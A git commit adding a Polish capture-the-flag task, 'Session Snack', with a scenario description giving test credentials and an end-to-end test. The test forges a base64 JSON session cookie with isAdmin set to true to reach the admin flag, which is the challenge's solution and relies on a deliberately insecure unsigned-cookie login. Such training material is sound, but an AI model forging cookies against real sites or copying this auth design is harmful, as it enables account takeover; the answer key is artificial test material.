6b232b31df2cd8b0f3678a058b28cf1fa9f48d94
P0midor <oberwankacper@gmail.com>
2026-05-16 12:27:05 +0200

    feat: cookie-auth fix everything that i fkd up last night

---
+++ tasks/cookie-auth/description.md
@@ -0,0 +1,20 @@
+# Session Snack
+
+W wyniku incydentu bezpieczeństwa doszło do wycieku części danych systemu informatycznego MPK.  
+Wstępna analiza wskazuje, że dane zostały ujawnione w wyniku ataku na system uwierzytelniania opartego na plikach cookie.
+
+Niestety wykradzione hasła nie dają możliwości bezpośredniego dostępu do panelu administracyjnego:
+
+- **Adres serwera** `session-snack.hack4krak.pl`
+- **Endpoint:** `/admin`
+- **Login:** `kanarzyca_halina`
+- **Hasło:** `bil3c1kPr0sze!!`
+
+---
+
+# Zadanie:
+
+Twoim zadaniem jest znalezienie sposobu na uzyskanie dostępu do panelu administratora (`/admin`).
+
+
+
---
+++ tasks/cookie-auth/tests/e2e.py
@@ -0,0 +1,28 @@
+import base64
+from pathlib import Path
+from urllib.parse import quote
+
+from toolbox.utils.test_utils import RequestHelper, check_status_code, load_flag_hash, validate_flag_hash
+
+request = RequestHelper(default_host="session-snack.hack4krak.pl")
+task_path = Path(__file__).parent.parent
+
+
+def test_non_admin_cannot_access_flag():
+    session = '{"username":"kanarzyca_halina","isAdmin":false}'
+    encoded_session = quote(base64.b64encode(session.encode()).decode())
+    cookies = {"session": encoded_session}
+    response = request.get("/admin/flag", cookies=cookies)
+    check_status_code(response, 403)
+
+
+def test_admin_can_access_flag():
+    session = '{"username":"kanarzyca_halina","isAdmin":true}'
+    encoded_session = quote(base64.b64encode(session.encode()).decode())
+    cookies = {"session": encoded_session}
+    response = request.get("/admin/flag", cookies=cookies)
+    check_status_code(response, 200)
+    response = response.json()
+    flag_content = response["flag"].split("{")[1].split("}")[0]
+
+    assert validate_flag_hash(flag_content, load_flag_hash(task_path))
